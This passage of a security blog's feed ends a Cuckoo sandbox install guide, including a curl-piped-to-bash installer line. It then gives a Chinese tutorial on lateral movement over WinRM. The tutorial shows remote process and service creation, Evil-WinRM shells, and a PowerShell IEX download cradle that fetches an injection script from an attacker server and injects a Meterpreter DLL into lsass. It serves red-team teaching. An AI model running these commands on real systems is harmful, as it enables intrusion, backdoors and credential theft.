+&lt;pre data-lang=&quot;shell&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-shell &quot;&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span&gt;sudo pip install --upgrade pip
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;pre data-lang=&quot;shell&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-shell &quot;&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span&gt;sudo pip install -U gdown==3.10.0 sqlalchemy==1.3.3 pefile==2019.4.18 pyrsistent==0.17.0 dpkt==1.8.7 jinja2==2.9.6 pymongo==3.0.3 bottle yara-python==3.6.3 requests==2.13.0 python-dateutil==2.4.2 chardet==2.3.0 setuptools psycopg2 pycrypto pydeep distorm3 cuckoo==2.0.7 weasyprint==0.36 m2crypto openpyxl ujson pycrypto pytz pyOpenSSL
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;&lt;strong&gt;step 4:&lt;&#x2F;strong&gt; Uninstall Werkzeug and reinstall (Werkzeug has a &lt;a href=&quot;https:&#x2F;&#x2F;stackoverflow.com&#x2F;questions&#x2F;60131900&#x2F;weird-is-xhr-error-when-deploying-flask-app-to-heroku&quot;&gt;version update&lt;&#x2F;a&gt; which leads to incompatibility with Cuckoo 2.0.7)&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;shell&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-shell &quot;&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span&gt;sudo pip uninstall werkzeug &amp;amp;&amp;amp; sudo pip install werkzeug==0.16.1
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;&lt;strong&gt;step 5:&lt;&#x2F;strong&gt; Install pySSDeep, yara and volatility&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;shell&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-shell &quot;&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span&gt;git clone https:&#x2F;&#x2F;github.com&#x2F;bunzen&#x2F;pySSDeep.git &amp;amp;&amp;amp; cd pySSDeep &amp;amp;&amp;amp; sudo python setup.py build &amp;amp;&amp;amp; sudo python setup.py install
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;pre data-lang=&quot;shell&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-shell &quot;&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span&gt;wget https:&#x2F;&#x2F;github.com&#x2F;VirusTotal&#x2F;yara&#x2F;archive&#x2F;v3.7.1.tar.gz &amp;amp;&amp;amp; tar -xzvf v3.7.1.tar.gz &amp;amp;&amp;amp; cd yara-3.7.1 &amp;amp;&amp;amp; sudo .&#x2F;bootstrap.sh &amp;amp;&amp;amp; sudo .&#x2F;configure --with-crypto --enable-cuckoo --enable-magic &amp;amp;&amp;amp; sudo make &amp;amp;&amp;amp; sudo make install
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;pre data-lang=&quot;shell&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-shell &quot;&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span&gt;git clone https:&#x2F;&#x2F;github.com&#x2F;volatilityfoundation&#x2F;volatility.git &amp;amp;&amp;amp; cd volatility &amp;amp;&amp;amp; sudo python setup.py build &amp;amp;&amp;amp; sudo python setup.py install
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;&lt;strong&gt;step 6:&lt;&#x2F;strong&gt; Configure tcpdump and system DNS&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;shell&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-shell &quot;&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span&gt;sudo aa-disable &#x2F;usr&#x2F;sbin&#x2F;tcpdump &amp;amp;&amp;amp; sudo setcap cap_net_raw,cap_net_admin=eip &#x2F;usr&#x2F;sbin&#x2F;tcpdump
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;pre data-lang=&quot;shell&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-shell &quot;&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span&gt;sudo sed -i &amp;quot;s&#x2F;127.0.0.53&#x2F;8.8.8.8&#x2F;g&amp;quot; &#x2F;etc&#x2F;resolv.conf
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;&lt;strong&gt;step 7:&lt;&#x2F;strong&gt; Start MongoDB service and initialize Cuckoo, pull community signatures&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;shell&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-shell &quot;&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span&gt;sudo service mongodb start &amp;amp;&amp;amp; cuckoo &amp;amp;&amp;amp; cuckoo community
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;&lt;strong&gt;step 8:&lt;&#x2F;strong&gt; Use VboxManage to create a hostonly ethernet adapter &lt;code&gt;vboxnet0&lt;&#x2F;code&gt;, and modify the default storage directory and permission for virtual machine files&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;shell&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-shell &quot;&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span&gt;vboxmanage hostonlyif create &amp;amp;&amp;amp; vboxmanage hostonlyif ipconfig vboxnet0 --ip 192.168.56.1 --netmask 255.255.255.0
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;pre data-lang=&quot;shell&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-shell &quot;&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span&gt;sudo mkdir &#x2F;data &amp;amp;&amp;amp; sudo mkdir &#x2F;data&#x2F;VirtualBoxVms &amp;amp;&amp;amp; sudo chmod 777 &#x2F;data&#x2F;VirtualBoxVms
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;pre data-lang=&quot;shell&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-shell &quot;&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span&gt;vboxmanage setproperty machinefolder &#x2F;data&#x2F;VirtualBoxVms
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;&lt;strong&gt;step 9:&lt;&#x2F;strong&gt; Import &lt;code&gt;Agent.ova&lt;&#x2F;code&gt;, boot up to take a snapshot, and add to Cuckoo&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;shell&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-shell &quot;&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span&gt;vboxmanage import ~&#x2F;Downloads&#x2F;Agent.ova &amp;amp;&amp;amp; vboxmanage modifyvm &amp;quot;Agent&amp;quot; --name &amp;quot;cuckoo1&amp;quot; &amp;amp;&amp;amp; vboxmanage startvm &amp;quot;cuckoo1&amp;quot; &amp;amp;&amp;amp; sleep 1m
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;pre data-lang=&quot;shell&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-shell &quot;&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span&gt;vboxmanage snapshot &amp;quot;cuckoo1&amp;quot; take &amp;quot;snap1&amp;quot; &amp;amp;&amp;amp; vboxmanage controlvm &amp;quot;cuckoo1&amp;quot; poweroff
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;pre data-lang=&quot;shell&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-shell &quot;&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span&gt;cuckoo machine --delete cuckoo1 &amp;amp;&amp;amp; cuckoo machine --add cuckoo1 192.168.56.101 --platform windows --snapshot snap1 
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;&lt;strong&gt;step 10:&lt;&#x2F;strong&gt; Configure iptables to enable IP forwarding&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;shell&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-shell &quot;&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span&gt;sudo iptables -A FORWARD -i vboxnet0 -s 192.168.56.0&#x2F;24 -m conntrack --ctstate NEW -j ACCEPT &amp;amp;&amp;amp; sudo iptables -A FORWARD -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT &amp;amp;&amp;amp; sudo iptables -A POSTROUTING -t nat -j MASQUERADE
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;pre data-lang=&quot;shell&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-shell &quot;&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span&gt;sudo vim &#x2F;etc&#x2F;sysctl.conf        # Open net.ipv4.ip_forward = 1
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;pre data-lang=&quot;shell&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-shell &quot;&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span&gt;sudo sysctl -p &#x2F;etc&#x2F;sysctl.conf &amp;amp;&amp;amp; sudo netfilter-persistent save
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;&lt;strong&gt;step 11:&lt;&#x2F;strong&gt; Modify the Cuckoo configuration file, open MongoDB and VirusTotal&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;shell&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-shell &quot;&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span&gt;vim ~&#x2F;.cuckoo&#x2F;conf&#x2F;reporting.conf        # Change mongodb status from off to on
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;pre data-lang=&quot;shell&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-shell &quot;&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span&gt;vim ~&#x2F;.cuckoo&#x2F;conf&#x2F;processing.conf       # Change virustotal status from off to on
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;&lt;strong&gt;step 12:&lt;&#x2F;strong&gt; Run Cuckoo&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;shell&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-shell &quot;&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span&gt;cuckoo
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;pre data-lang=&quot;shell&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-shell &quot;&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span&gt;cuckoo web -H 0.0.0.0 -p 8000
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;Thus far, We have successfully installed a Cuckoo sandbox. We can submit sample files to Cuckoo through web service on port &lt;code&gt;8000&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
+&lt;h1 id=&quot;automation&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#automation&quot; aria-label=&quot;Anchor link for: automation&quot;&gt;Automation&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
+&lt;p&gt;Finally, I wrote the above process into a shell script to automate the installation of Cuckoo sandbox.&lt;&#x2F;p&gt;
+&lt;p&gt;You just need to prepare a clean Ubuntu and run following command:&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;shell&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-shell &quot;&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span&gt;bash &amp;lt;(curl -sS -L https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;S4kur4&#x2F;AutoDeployCuckoo&#x2F;master&#x2F;install.sh)
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;Perhaps it&#x27;s the best script to install Cuckoo today?&lt;&#x2F;p&gt;
+&lt;p&gt;The code is here: &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;S4kur4&#x2F;AutoDeployCuckoo&quot;&gt;AutoDeployCuckoo&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;strong&gt;* Reproduced this article please indicate the original source and author&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
+</content>
+        
+    </entry>
+    <entry xml:lang="en">
+        <title>内网横移之WinRM</title>
+        <published>2019-09-25T00:00:00+00:00</published>
+        <updated>2019-09-25T00:00:00+00:00</updated>
+        
+        <author>
+          <name>
+            
+              Unknown
+            
+          </name>
+        </author>
+        
+        <link rel="alternate" type="text/html" href="https://0x0c.cc/posts/nei-wang-heng-yi-zhi-winrm/"/>
+        <id>https://0x0c.cc/posts/nei-wang-heng-yi-zhi-winrm/</id>
+        
+        <content type="html" xml:base="https://0x0c.cc/posts/nei-wang-heng-yi-zhi-winrm/">&lt;h1 id=&quot;ws-managementxie-yi-ji-winrm&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#ws-managementxie-yi-ji-winrm&quot; aria-label=&quot;Anchor link for: ws-managementxie-yi-ji-winrm&quot;&gt;WS-Management协议及WinRM&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
+&lt;p&gt;Web服务管理协议（WS-Management，Web Services-Management）是一种基于SOAP协议的DMTF开放标准，用于对服务器等网络设备以及各种Web应用程序进行管理。WinRM（&lt;a href=&quot;https:&#x2F;&#x2F;docs.microsoft.com&#x2F;en-us&#x2F;windows&#x2F;win32&#x2F;winrm&#x2F;portal&quot;&gt;Windows Remote Management&lt;&#x2F;a&gt;）是Windows对WS-Management的实现，允许远程用户使用工具和脚本对Windows服务器进行管理并获取数据。WinRM服务自Windows Vista开始成为Windows的默认组件，在运行与启动上有以下几个特点：&lt;&#x2F;p&gt;
+&lt;ol&gt;
+&lt;li&gt;在Windows Vista上必须手动启动WinRM服务，但从Windows Server 2008开始，WinRM服务自动启动&lt;&#x2F;li&gt;
+&lt;li&gt;默认情况下，WinRM服务后台已经运行，但并不开启监听模式，因此无法接受和发送数据&lt;&#x2F;li&gt;
+&lt;li&gt;使用WinRM提供的&lt;code&gt;quickconfig&lt;&#x2F;code&gt;对WinRM进行配置后，Windows将开启监听并打开HTTP及HTTPS监听端口，同时Windows防火墙生成这两个端口的例外&lt;&#x2F;li&gt;
+&lt;&#x2F;ol&gt;
+&lt;p&gt;WinRM的组件主要由以下几部分构成：&lt;&#x2F;p&gt;
+&lt;ol&gt;
+&lt;li&gt;WinRM Scritping API：提供给外部的用于执行管理操作的接口&lt;&#x2F;li&gt;
+&lt;li&gt;winrm.cmd和winrm.vbs：系统内置的用于配置WinRM的命令行工具，基于VBS脚本并使用了WinRM Scritping API&lt;&#x2F;li&gt;
+&lt;li&gt;winrs.exe：基于命令行的工具，此工具作为客户端使用，用于远程连接运行WinRM的服务器并执行大多数的cmd命令&lt;&#x2F;li&gt;
+&lt;&#x2F;ol&gt;
+&lt;p&gt;可以参照Windows给出的&lt;a href=&quot;https:&#x2F;&#x2F;docs.microsoft.com&#x2F;en-us&#x2F;windows&#x2F;win32&#x2F;winrm&#x2F;installation-and-configuration-for-windows-remote-management&quot;&gt;WinRM安装和配置文档&lt;&#x2F;a&gt;快速配置WinRM环境。&lt;&#x2F;p&gt;
+&lt;p&gt;在命令行中执行&lt;code&gt;winrm quickconfig&lt;&#x2F;code&gt;对WinRM进行首次（默认）配置：&lt;&#x2F;p&gt;
+&lt;img src=&quot;https:&#x2F;&#x2F;i.loli.net&#x2F;2019&#x2F;09&#x2F;25&#x2F;8UVIi5b9XMHJWYT.png&quot; alt=&quot;1&quot; style=&quot;zoom: 33%;&quot; &#x2F;&gt;
+&lt;p&gt;此时，WinRM服务已经开始监听5985&#x2F;TCP（从WinRM2.0开始，服务的HTTP默认监听端口由原来的80&#x2F;TCP变更为5985&#x2F;TCP）端口并等待远程主机进行访问，通过&lt;code&gt;winrm enumerate winrm&#x2F;config&#x2F;listener&lt;&#x2F;code&gt;查看WinRM服务当前的配置情况：&lt;&#x2F;p&gt;
+&lt;img src=&quot;https:&#x2F;&#x2F;i.loli.net&#x2F;2019&#x2F;09&#x2F;25&#x2F;kG1XNpV4cwPM6Hi.png&quot; alt=&quot;2&quot; style=&quot;zoom: 33%;&quot; &#x2F;&gt;
+&lt;p&gt;以此配置为例，此时远程主机已经可以通过WS-Management协议访问&lt;code&gt;http:&#x2F;&#x2F;10.0.83.30&#x2F;wsman&lt;&#x2F;code&gt;连接当前服务器的WinRM服务。不过，WinRM只允许当前域用户或者处于本机TrustedHosts列表中的远程主机进行访问。因此在连接之前，还需要确保发起连接的主机与当前服务器处于同一域或者两台主机的WinRM服务TrustedHosts中必须存在对方主机的IP或主机名，这里类似于一个白名单机制。可以执行&lt;code&gt;winrm set winrm&#x2F;config&#x2F;client @{TrustedHosts=&quot;*&quot;}&lt;&#x2F;code&gt;手动配置当前服务器允许被任意主机连接：&lt;&#x2F;p&gt;
+&lt;img src=&quot;https:&#x2F;&#x2F;i.loli.net&#x2F;2019&#x2F;09&#x2F;25&#x2F;6nLzhXdDwvl1FTs.png&quot; alt=&quot;3&quot; style=&quot;zoom:33%;&quot; &#x2F;&gt;
+&lt;p&gt;在本地Windows主机上也进行相同的设置，允许连接任意Windows主机。接着，使用winrs客户端连接这台Windows服务器即可直接执行系统命令，例如运行&lt;code&gt;winrs -r:http:&#x2F;&#x2F;10.0.83.30:5985 -u:administrator -p:123456 ipconfig&lt;&#x2F;code&gt;得到网络配置信息：&lt;&#x2F;p&gt;
+&lt;img src=&quot;https:&#x2F;&#x2F;i.loli.net&#x2F;2019&#x2F;09&#x2F;25&#x2F;ZjHc5Fxv4akPVTC.png&quot; alt=&quot;4&quot; style=&quot;zoom:33%;&quot; &#x2F;&gt;
+&lt;p&gt;上述操作为WinRM服务的一次简单的配置和使用过程。&lt;&#x2F;p&gt;
+&lt;p&gt;在Windows中，除了WinRM本身，其他一些工具和一些第三方工具也都借助了WinRM所提供的功能。例如：&lt;&#x2F;p&gt;
+&lt;ol&gt;
+&lt;li&gt;PowerShell：自2.0开始引入了Remoting技术，即远程执行PowerShell命令，此技术基于WinRM服务实现。&lt;&#x2F;li&gt;
+&lt;li&gt;Ansible：基于Python的开源IT自动化平台，使用pywinrm库远程管理Windows服务器，基于WinRM服务。&lt;&#x2F;li&gt;
+&lt;&#x2F;ol&gt;
+&lt;h1 id=&quot;nei-wang-heng-yi-zhong-de-winrm&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#nei-wang-heng-yi-zhong-de-winrm&quot; aria-label=&quot;Anchor link for: nei-wang-heng-yi-zhong-de-winrm&quot;&gt;内网横移中的WinRM&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
+&lt;p&gt;WinRM服务提供远程执行系统命令的特点，将使得内网环境下的横向移动变得极为方便。&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;tong-guo-winrmzhi-jie-jin-xing-heng-xiang-yi-dong&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#tong-guo-winrmzhi-jie-jin-xing-heng-xiang-yi-dong&quot; aria-label=&quot;Anchor link for: tong-guo-winrmzhi-jie-jin-xing-heng-xiang-yi-dong&quot;&gt;通过WinRM直接进行横向移动&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
+&lt;p&gt;在winrm.vbs的参数选项中有一个&lt;code&gt;invoke&lt;&#x2F;code&gt;参数，此操作允许使用WinRM对目标对象执行特定方法。执行命令&lt;code&gt;winrm invoke Create wmicimv2&#x2F;win32_process @{CommandLine=&quot;calc.exe&quot;} &lt;&#x2F;code&gt;将会在本地弹出计算器：&lt;&#x2F;p&gt;
+&lt;img src=&quot;https:&#x2F;&#x2F;i.loli.net&#x2F;2019&#x2F;09&#x2F;25&#x2F;PCyGNcBV4nh8LpK.png&quot; alt=&quot;15&quot; style=&quot;zoom:30%;&quot; &#x2F;&gt;
+&lt;p&gt;该命令调用Windows WMI中Win32_process类的Create方法，生成了一个calc.exe的新进程。通过这种方式，可以使用WinRM在远程Windows服务器上起一个新进程。例如执行：&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#fafafa;color:#61676c;&quot;&gt;&lt;code&gt;&lt;span&gt;winrm invoke Create wmicimv2&#x2F;win32_process @{CommandLine=&amp;quot;calc.exe&amp;quot;} -r:http:&#x2F;&#x2F;10.0.83.30:5985 -u:administrator -p:123456
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;可以在远程在Windows服务器上运行一个静默执行的calc.exe新进程：&lt;&#x2F;p&gt;
+&lt;img src=&quot;https:&#x2F;&#x2F;i.loli.net&#x2F;2019&#x2F;09&#x2F;25&#x2F;ZBlec4q5HAgVCKr.png&quot; alt=&quot;16&quot; style=&quot;zoom:30%;&quot; &#x2F;&gt;
+&lt;img src=&quot;https:&#x2F;&#x2F;i.loli.net&#x2F;2019&#x2F;09&#x2F;25&#x2F;7U5oYdbO34lgK61.gif&quot; alt=&quot;17&quot; style=&quot;zoom:60%;&quot; &#x2F;&gt;
+&lt;p&gt;同样，也可以调用Win32_service类的Create方法，以生成服务的形式运行特定程序。首先执行以下命令创建服务：&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#fafafa;color:#61676c;&quot;&gt;&lt;code&gt;&lt;span&gt;winrm invoke Create wmicimv2&#x2F;Win32_Service @{Name=&amp;quot;test&amp;quot;;DisplayName=&amp;quot;test&amp;quot;;PathName=&amp;quot;cmd.exe &#x2F;k c:\windows\system32\calc.exe&amp;quot;} -r:http:&#x2F;&#x2F;10.0.83.30:5985 u:administrator -p:123456
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;接着执行下面的命令运行服务：&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#fafafa;color:#61676c;&quot;&gt;&lt;code&gt;&lt;span&gt;winrm invoke StartService wmicimv2&#x2F;Win32_Service?Name=test -r:http:&#x2F;&#x2F;10.0.83.30:5985 u:administrator -p:123456
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;使用上述方法即可控制远程主机下载远控后门并达到持续渗透和权限维持的目的。&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;tong-guo-winrmjian-jie-jin-xing-heng-xiang-yi-dong&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#tong-guo-winrmjian-jie-jin-xing-heng-xiang-yi-dong&quot; aria-label=&quot;Anchor link for: tong-guo-winrmjian-jie-jin-xing-heng-xiang-yi-dong&quot;&gt;通过WinRM间接进行横向移动&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
+&lt;p&gt;在第一节的配置环境基础上，下面测试使用PowerShell远程获得Windows服务器的交互式PowerShell，这首先需要确保Windows服务器正在运行WinRM服务并允许PowerShell被远程连接。可在Windows服务器的PowerShell中执行&lt;code&gt;Enable-PSRemoting –force&lt;&#x2F;code&gt;开启PowerShell的远程连接：&lt;&#x2F;p&gt;
+&lt;img src=&quot;https:&#x2F;&#x2F;i.loli.net&#x2F;2019&#x2F;09&#x2F;25&#x2F;jlWODBXvQN4AM61.png&quot; alt=&quot;6&quot; style=&quot;zoom:25%;&quot; &#x2F;&gt;
+&lt;p&gt;此时，在另一台Windows主机上使用PowerShell执行&lt;code&gt; Enter-PSSession -ComputerName 10.0.83.30 -Credential administrator&lt;&#x2F;code&gt;即可连接至这台Windows服务器，在弹框中输入密码，获得这台Windows服务器的交互式PowerShell：&lt;&#x2F;p&gt;
+&lt;img src=&quot;https:&#x2F;&#x2F;i.loli.net&#x2F;2019&#x2F;09&#x2F;25&#x2F;oC1mILBTWujfVhq.png&quot; alt=&quot;7&quot; style=&quot;zoom:25%;&quot; &#x2F;&gt;
+&lt;p&gt;此过程的流程图如下：&lt;&#x2F;p&gt;
+&lt;img src=&quot;https:&#x2F;&#x2F;i.loli.net&#x2F;2019&#x2F;09&#x2F;25&#x2F;GSC8QN7lkqvjunW.png&quot; alt=&quot;5&quot; style=&quot;zoom:50%;&quot; &#x2F;&gt;
+&lt;p&gt;WinRM在这里作为通道连接了两端的PowerShell。当然，在红队角度来说，工具是千变万化的。&lt;&#x2F;p&gt;
+&lt;p&gt;Python与Ruby均有支持WinRM操作的库，这使得连接WinRM的方式将更加灵活，攻击活动将被控制在命令行中。例如GitHub上的开源工具&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;Hackplayers&#x2F;evil-winrm&quot;&gt;Evil-WinRM&lt;&#x2F;a&gt;，使用WinRM的ruby库&lt;code&gt;winrm&lt;&#x2F;code&gt;及&lt;code&gt;winrm-fs&lt;&#x2F;code&gt;，可以通过WinRM服务快速获得一个交互式Shell，并支持PowerShell的全部命令。&lt;&#x2F;p&gt;
+&lt;img src=&quot;https:&#x2F;&#x2F;i.loli.net&#x2F;2019&#x2F;09&#x2F;25&#x2F;b4quPJWVxQFivXK.png&quot; alt=&quot;8&quot; style=&quot;zoom:30%;&quot; &#x2F;&gt;
+&lt;p&gt;接下来我们尝试通过Evil-WinRM工具连接远程Windows服务器的WinRM服务并获得交互式PowerShell。克隆项目后执行命令&lt;code&gt;ruby evil-wnrm.rb -i 10.0.83.30 -u administrator -p 123456&lt;&#x2F;code&gt;即可连接至运行WinRM服务的Windows服务器：&lt;&#x2F;p&gt;
+&lt;img src=&quot;https:&#x2F;&#x2F;i.loli.net&#x2F;2019&#x2F;09&#x2F;25&#x2F;w2KL9HF5qTuiGsl.png&quot; alt=&quot;9&quot; style=&quot;zoom:30%;&quot; &#x2F;&gt;
+&lt;p&gt;另外，Evil-WinRM提供了一个menu命令，可通过加载&lt;code&gt;Invoke-Binary&lt;&#x2F;code&gt;和&lt;code&gt;l04d3r-LoadDll&lt;&#x2F;code&gt;两个自定义函数，实现无文件执行PE文件和DLL加载，但实际测试时这两个函数无法稳定使用，加载Meterpreter Payload会出现报错情况。&lt;&#x2F;p&gt;
+&lt;p&gt;当然还有更优雅的方式，例如使用PowerSploit。&lt;&#x2F;p&gt;
+&lt;p&gt;首先，生成一个包含Meterpreter Payload的DLL文件t0y.dll。接着通过&lt;code&gt;python -m SimpleHTTPServer 8000&lt;&#x2F;code&gt;开启临时HTTP服务，将&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;clymb3r&#x2F;PowerShell&#x2F;blob&#x2F;master&#x2F;Invoke-ReflectivePEInjection&#x2F;Invoke-ReflectivePEInjection.ps1&quot;&gt;@clymb3r&lt;&#x2F;a&gt;修改后的反射DLL文件注入脚本Invoke-ReflectivePEInjection.ps1与t0y.dll一同放置在目录下，以便使远程服务器获取。使MSF监听本地端口以得到Meterpreter会话：&lt;&#x2F;p&gt;
+&lt;img src=&quot;https:&#x2F;&#x2F;i.loli.net&#x2F;2019&#x2F;09&#x2F;25&#x2F;srjy3I9uiOkZS8J.png&quot; alt=&quot;11&quot; style=&quot;zoom:30%;&quot; &#x2F;&gt;
+&lt;p&gt;在Evil-WinRM的交互式Shell中直接执行：&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#fafafa;color:#61676c;&quot;&gt;&lt;code&gt;&lt;span&gt;IEX (New-Object Net.WebClient).DownloadString(&amp;#39;http:&#x2F;&#x2F;10.0.84.102:8000&#x2F;Invoke-ReflectivePEInjection.ps1&amp;#39;);Invoke-ReflectivePEInjection -PEUrl http:&#x2F;&#x2F;10.0.84.102:8000&#x2F;t0y.dll -procname lsass
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;此时将下载Invoke-ReflectivePEInjection.ps1执行，并将t0y.dll注入到lsass进程中：&lt;&#x2F;p&gt;
